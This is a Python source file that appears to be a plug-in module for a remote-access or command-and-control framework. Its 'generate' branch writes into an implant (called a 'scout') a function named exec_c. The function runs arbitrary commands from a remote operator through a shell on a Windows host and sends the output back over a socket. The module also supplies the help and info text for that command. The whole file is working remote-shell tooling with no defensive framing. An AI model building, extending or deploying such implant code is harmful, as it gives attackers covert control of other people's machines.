# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('from subprocess import Popen, PIPE')
        config.import_statements.append('from os import chdir')
        config.functions.append('''
def exec_c(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        s.sendall(("[+]Changed to directory : " + execute).encode())
    else:
        result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        s.sendall(('[+]Command output : \\n' + result.decode()).encode())''')
        config.logics.append('''
            elif command == "exec_c":
                exec_c(data)''')
        config.help_menu[
            'exec_c <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd.exe'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Execute command CMD component",
                "OS": "Windows",
                "Required Modules": "subprocess",
                "Commands": "exec_c <shell command>",
                "Description": "A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd"}
        elif interface == "CUI":
            print('\nName             : Execute command CMD component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : subprocess' \
                  '\nCommands         : exec_c <shell command>' \
                  '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd\n')
